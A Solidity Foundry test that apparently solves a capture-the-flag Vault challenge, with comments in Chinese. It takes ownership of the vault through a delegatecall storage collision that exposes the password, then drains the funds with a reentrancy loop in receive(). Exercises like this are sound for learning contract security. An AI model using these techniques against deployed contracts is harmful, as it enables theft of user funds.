// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../src/Vault.sol";

contract VaultExploiter is Test {
    Vault public vault;
    VaultLogic public logic;

    address owner = address(1);
    address palyer = address(2);
    bytes32 PASSWORD = bytes32("0x1234");

    function setUp() public {
        // 初始化测试环境
        vm.deal(owner, 1 ether);
        vm.startPrank(owner);

        // 部署 VaultLogic 和 Vault 合约
        logic = new VaultLogic(PASSWORD);
        vault = new Vault(address(logic));

        // 所有者向 Vault 存入 0.1 ether
        vault.deposite{value: 0.1 ether}();
        vm.stopPrank();
    }

    function testExploit() public {
        // 为攻击者提供资金并开始模拟攻击者的操作
        vm.deal(palyer, 1 ether);
        vm.startPrank(palyer);

        // 1. 获取密码：利用 logic 合约地址作为密码
        // 2. 使用密码更改所有者
        // 3. 准备重入攻击

        // 构造调用数据以更改所有者
        bytes memory callData = abi.encodeWithSelector(
            bytes4(keccak256("changeOwner(bytes32,address)")),
            bytes32(uint256(uint160(address(logic)))),
            palyer
        );

        // 4. 执行低级调用以更改所有者
        (bool success, ) = address(vault).call(callData);
        require(success, "Call failed");

        // 开启提款功能
        vault.openWithdraw();

        // 检查合约初始余额
        uint256 initialBalance = address(vault).balance;
        console.log("initialBalance: %d", initialBalance);


        vm.stopPrank();

        // 使用当前合约进行存款和提款，触发重入攻击
        vault.deposite{value: 0.01 ether}();
        vault.withdraw();

        // 检查合约最终余额
        uint256 finalBalance = address(vault).balance;
        console.log("finalBalance: %d", finalBalance);

        // 验证攻击是否成功
        require(vault.isSolve(), "Not solved");
    }

    // 回退函数：用于执行重入攻击
    receive() external payable {
        // 在接收 ether 时立即调用 withdraw 函数，形成循环提款
        vault.withdraw();
    }
}